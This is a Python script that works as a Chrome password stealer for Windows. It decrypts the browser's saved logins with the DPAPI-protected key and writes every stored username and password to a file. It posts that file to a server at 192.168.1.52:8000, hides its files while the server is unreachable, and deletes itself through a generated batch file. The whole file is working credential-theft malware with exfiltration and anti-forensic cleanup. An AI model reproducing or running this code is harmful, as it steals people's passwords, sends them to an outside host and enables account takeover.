import os
import json
import base64
import sqlite3
import win32crypt
import requests
import time
import socket
from Crypto.Cipher import AES
import shutil
import datetime
import subprocess
import sys
from datetime import timezone, datetime, timedelta

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""

def is_server_alive(url):
    try:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Set a timeout for the connection attempt (adjust as needed)
        s.settimeout(5)
        
        # Try to connect to the server
        s.connect(("192.168.1.52", 8000))
        
        # Close the socket
        s.close()
        
        return True
    except (socket.timeout, ConnectionRefusedError):
        return False
    
def uploadFile(passwordFile):
    # Define the URL of the server where you want to upload the file
    upload_url = 'http://192.168.1.52:8000/'
    print(passwordFile)
    # Specify the file you want to upload
    file_to_upload = passwordFile  # Replace with the path to your .txt file
    script_name = os.path.basename(__file__)[:-3] + ".exe"
    try:
        with open(file_to_upload, 'rb') as file:
            # Create a dictionary with the file as part of a multipart form-data request
            files = {'file': (file_to_upload, file)}

            # Send a POST request with the file to the server
            response = requests.post(upload_url, files=files)

            # Check the response status code to ensure the upload was successful
            if response.status_code == 200:
                print(f"File {file_to_upload} uploaded successfully.")
                
            else:
                print(f"File upload failed with status code: {response.status_code}")

    except FileNotFoundError:
        print(f"File {file_to_upload} not found.")
    except requests.ConnectionError:
        print("Unable to connect to the server.")
    print(script_name)

    time.sleep(1)

    print("Files deleted")

def selfDestruct(passwordFile):
    # Example usage:
    server_url = "http://192.168.1.52:8000"
    script_name = os.path.basename(__file__)[:-3] + ".exe"

    if is_server_alive(server_url):
        subprocess.check_output("attrib -h " + "ChromeData.db", shell=True, universal_newlines=True)
        subprocess.check_output("attrib -h " + passwordFile, shell=True, universal_newlines=True)
        subprocess.check_output("attrib -h " + script_name, shell=True, universal_newlines=True)

        print(f"The server at {server_url} is alive.")
        uploadFile(passwordFile)
    else:
        subprocess.check_output("attrib +h " + "ChromeData.db", shell=True, universal_newlines=True)
        subprocess.check_output("attrib +h " + passwordFile, shell=True, universal_newlines=True)
        subprocess.check_output("attrib +h " + script_name, shell=True, universal_newlines=True)

        print(f"The server at {server_url} is not responding.")
        time.sleep(2)
        selfDestruct(passwordFile)

def removeSelf():
    file_path = "del.bat"  # Replace with the path to your file
    with open(file_path, 'w') as file:
        # Write content to the file
        file.write("timeout -t 1 >nul\n")
        file.write("DEL " + os.getcwd() + "\\"+ os.path.basename(__file__)[:-3] + ".exe\n")
        file.write("DEL " + os.getcwd() + "\\"+ "del.bat\n")

def main():
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    
    passwordFile = "passwords-" + str(datetime.now().strftime("%Y-%m-%d")) + "-" + str(os.getenv('USERNAME')) + ".txt"
    # iterate over all rows
    with open(passwordFile, "w", encoding="utf-8") as fi:
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2] 
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]        
            if username or password:
                fi.write(f"Origin URL: {origin_url}\n")
                fi.write(f"Action URL: {action_url}\n")
                fi.write(f"Username: {username}\n")
                fi.write(f"Password: {password}\n")
                fi.write("==========================================\n")
                print(f"Origin URL: {origin_url}")
                print(f"Action URL: {action_url}")
                print(f"Username: {username}")
                print(f"Password: {password}")
            else:
                continue
            if date_created != 86400000000 and date_created:
                print(f"Creation date: {str(get_chrome_datetime(date_created))}")
            if date_last_used != 86400000000 and date_last_used:
                print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
            print("="*50)

    cursor.close()
    db.close()
    selfDestruct(passwordFile)

    
    os.remove(passwordFile)
    time.sleep(1)

    try:
        # try to remove the copied db file
        os.remove(filename)

        removeSelf()
        os.startfile(os.getcwd() + "\del.bat")
        sys.exit()
            
    except:
        pass


if __name__ == "__main__":
    main()
